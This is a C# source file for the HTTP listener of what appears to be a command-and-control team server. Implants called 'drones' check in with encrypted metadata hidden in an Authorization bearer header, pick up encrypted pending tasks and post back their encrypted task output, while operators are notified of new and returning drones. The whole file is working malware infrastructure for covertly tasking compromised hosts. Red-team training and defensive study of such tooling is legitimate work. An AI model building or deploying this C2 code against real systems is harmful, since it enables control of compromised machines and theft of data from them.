using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.SignalR;

using TeamServer.Interfaces;
using TeamServer.Models;
using TeamServer.Services;
using TeamServer.Utilities;

namespace TeamServer.Handlers;

public class HttpHandlerController : ControllerBase
{
    private readonly ICryptoService _crypto;
    private readonly IDroneService _drones;
    private readonly ITaskService _tasks;
    private readonly IConfiguration _config;
    private readonly IHubContext<HubService, IHubService> _hub;

    public HttpHandlerController(ICryptoService crypto, IDroneService drones, ITaskService tasks, IConfiguration config,
        IHubContext<HubService, IHubService> hub)
    {
        _crypto = crypto;
        _drones = drones;
        _tasks = tasks;
        _config = config;
        _hub = hub;
    }

    public async Task<IActionResult> RouteDrone()
    {
        var metadata = await ExtractMetadata();

        if (metadata is null)
            return NotFound();

        // try and get drone
        var drone = await GetDrone(metadata);
        
        // if post read body
        if (HttpContext.Request.Method.Equals("POST", StringComparison.OrdinalIgnoreCase))
            await ReadRequestBody();
        
        // get pending tasks
        var tasks = (await _tasks.GetPendingTasks(drone.Id)).ToArray();
        
        if (!tasks.Any())
            return NoContent();
        
        // encrypt
        var (iv, data, checksum) = await _crypto.EncryptObject(tasks);
        
        var message = new C2Message
        {
            DroneId = drone.Id,
            Iv = iv,
            Data = data,
            Checksum = checksum
        };
        
        return new FileContentResult(message.Serialize(), "application/octet-stream");
    }

    private async Task<Metadata> ExtractMetadata()
    {
        if (!HttpContext.Request.Headers.TryGetValue("Authorization", out var values))
            return null;
        
        // remove "bearer "
        var b64 = values[0].Remove(0, 7);
        var enc = Convert.FromBase64String(b64);
        var (iv, data, checksum) = enc.FromByteArray();

        return await _crypto.DecryptObject<Metadata>(iv, data, checksum);
    }

    private async Task<Drone> GetDrone(Metadata metadata)
    {
        var drone = await _drones.GetDrone(metadata.Id);

        // if null create a new one
        if (drone is null)
        {
            drone = new Drone(metadata)
            {
                Handler = _config.GetValue<string>("name"),
                ExternalAddress = HttpContext.Connection.RemoteIpAddress?.ToString()
            };

            // add to db
            await _drones.AddDrone(drone);
            
            // notify hub
            await _hub.Clients.All.NotifyNewDrone(drone.Id);
        }
        else // else check-in and update
        {
            drone.CheckIn();
            
            //  update db
            await _drones.UpdateDrone(drone);
            
            // notify hub
            await _hub.Clients.All.NotifyDroneCheckedIn(drone.Id);
        }

        return drone;
    }

    private async Task ReadRequestBody()
    {
        using var ms = new MemoryStream();
        await HttpContext.Request.Body.CopyToAsync(ms);

        // get message
        var message = ms.ToArray().Deserialize<C2Message>();
        
        if (message is null)
            return;
        
        // decrypt
        IEnumerable<DroneTaskOutput> outputs = null;
        
        try
        {
            outputs = await _crypto.DecryptObject<IEnumerable<DroneTaskOutput>>(message.Iv, message.Data, message.Checksum);
        }
        catch (CryptoException e)
        {
            Console.WriteLine($"[!] {e.Message}");
        }
        
        if (outputs is null)
            return;

        await _tasks.UpdateTasks(outputs);
    }
}